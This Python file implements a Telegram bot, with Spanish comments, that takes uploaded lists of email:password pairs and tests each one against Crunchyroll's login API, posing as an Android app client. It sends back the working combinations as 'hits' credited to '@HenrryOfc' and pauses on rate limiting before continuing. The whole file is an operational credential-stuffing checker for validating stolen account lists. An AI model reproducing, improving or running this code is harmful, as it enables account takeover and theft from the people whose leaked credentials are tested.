import telebot
import requests
import random
import os
import time

# Función para solicitar la contraseña
def solicitar_contraseña():
    contraseña_correcta = "@HenrryOfc"
    while True:
        contraseña = input('Ingrese la contraseña: ')
        if contraseña == contraseña_correcta:
            return
        else:
            print('Contraseña incorrecta. Inténtalo de nuevo.')

# Solicita la contraseña antes de solicitar el token del bot
solicitar_contraseña()

# Configura tus credenciales de Telegram
TOKEN = input('Ingrese el TOKEN de su bot de Telegram: ')

# Inicializa el bot de Telegram
bot = telebot.TeleBot(TOKEN)

device_id = ''.join(random.choice('0123456789abcdef') for _ in range(32))

# Diccionario para controlar el tiempo de respuesta
last_response_time = {}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Hola! Envíame un archivo con las credenciales para procesar.")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    current_time = time.time()
    user_id = message.from_user.id
    
    # Verifica el tiempo desde la última respuesta
    if user_id in last_response_time:
        elapsed_time = current_time - last_response_time[user_id]
        if elapsed_time < 120:
            bot.reply_to(message, "Por favor, espera un 2 minutos antes de enviar otro archivo.")
            return
    
    # Actualiza el tiempo de la última respuesta
    last_response_time[user_id] = current_time
    
    # Enviar mensaje de "Cargando..."
    loading_message = bot.reply_to(message, "Cargando...")

    # Descarga el archivo
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    # Guarda el archivo en el servidor
    file_path = 'received_file.txt'
    with open(file_path, 'wb') as new_file:
        new_file.write(downloaded_file)
    
    # Procesa el archivo
    with open(file_path, 'r') as file:
        file_content = file.read().splitlines()

    results = []
    for xx in file_content:
        if ":" in xx:
            email = xx.split(':')[0]
            pasw = xx.split(':')[1]

            url = "https://beta-api.crunchyroll.com/auth/v1/token"

            headers = {
                "host": "beta-api.crunchyroll.com",
                "authorization": "Basic d2piMV90YThta3Y3X2t4aHF6djc6MnlSWlg0Y0psX28yMzRqa2FNaXRTbXNLUVlGaUpQXzU=",
                "x-datadog-sampling-priority": "0",
                "etp-anonymous-id": "855240b9-9bde-4d67-97bb-9fb69aa006d1",
                "content-type": "application/x-www-form-urlencoded",
                "accept-encoding": "gzip",
                "user-agent": "Crunchyroll/3.59.0 Android/14 okhttp/4.12.0"
            }

            data = {
                "username": email,
                "password": pasw,
                "grant_type": "password",
                "scope": "offline_access",
                "device_id": device_id,
                "device_name": "SM-G9810",
                "device_type": "samsung SM-G955N"
            }

            res = requests.post(url, data=data, headers=headers)

            if "refresh_token" in res.text:
                results.append(
                    f'───────── [ᛗ] ─────────\n'
                    f'Correo ➳ {email}\n'
                    f'Contraseña ➳ {pasw}\n'
                    f'Bot by ➳ @HenrryOfc\n'
                    f'───────── [ᛗ] ─────────'
                )

            elif "406 Not Acceptable" in res.text:
                print(f'{email}:{pasw} - 406 Not Acceptable ❗')
                time.sleep(360)
            else:
                print(f'{email}:{pasw} - 𝘦𝘳𝘳𝘰𝘳 ❌')

    # Envía los resultados "good" al usuario
    if results:
        result_message = '\n'.join(results)
    else:
        result_message = "No se encontraron hits by @HenrryOfc"

    # Actualiza el mensaje de "Cargando..." con los resultados
    bot.edit_message_text(chat_id=message.chat.id, message_id=loading_message.message_id, text=result_message)

bot.polling()
